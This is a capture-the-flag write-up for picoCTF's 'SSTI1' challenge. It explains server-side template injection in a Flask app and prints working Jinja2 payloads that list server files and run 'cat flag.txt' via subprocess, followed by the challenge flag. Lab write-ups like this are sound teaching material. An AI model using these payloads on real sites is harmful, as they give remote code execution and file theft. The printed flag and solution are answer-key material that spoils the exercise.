# SSTI1
I made a cool website where you can announce whatever you want! Try it out!

I heard templating is a cool and modular way to build web apps! Check out my website!

> [!NOTE]
> You'll need to launch the challenge instance in PicoGym.
> In this directory, you'll find the same website setup in `app.py`.
>
> To run the application locally, execute the following:
> 1. `pip install --requirement requirements.txt`
> 1. `flask run`
>
> After your app is running locally, you could solve the challenge.


# Solution
This challenge introduces you to server side template rendering, Python built-in functions, and remote code execution on the server.

I began by inspecting the code in the browsers DevTool. Very quickly I realized that this application has a straightforward form,
thus the user provided input field is where I should focus my efforts.

At this time, I did not know anything about [Server Side Template Injections](https://en.wikipedia.org/wiki/Code_injection#Server_Side_Template_Injection), however by putting `{{self}}` in the forms input field and getting `<TemplateReference None>` as the output made me realize that the backend is in `Python`.


Next I learned that in Python, `__globals__` is an attribute of a function that provides a dictionary of all the variables accessible from that functions scope. Considering that I know `self` exists, and each python class has the `__init__` constructor function, I tried `{{self.__init__.__globals__}}`. This resulted in a large list of functions and variables that I could call and access. Very quickly I saw `__import__` in the output.

> The `__import__` function is a python built-in function that provides a mechanism for dynamically importing modules.

The called `listdir()` to get a list of all the files on the server:

```html
</h1><pre>{{self.__init__.__globals__.__builtins__.__import__('os').listdir()}}</pre><h1>
```

```python
['README.md', 'requirements.txt', 'flag.txt', 'app.py']
```

Great, I see that the `flag.txt` file exists. Now I just have to output the contents of that file:

```html
</h1><pre>{{self.__init__.__globals__.__builtins__.__import__('subprocess').run(['cat', 'flag.txt'], capture_output=True, text=True).stdout}}</pre><h1>
```


# Flag

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}`


# Hints

1. Server Side Template Injection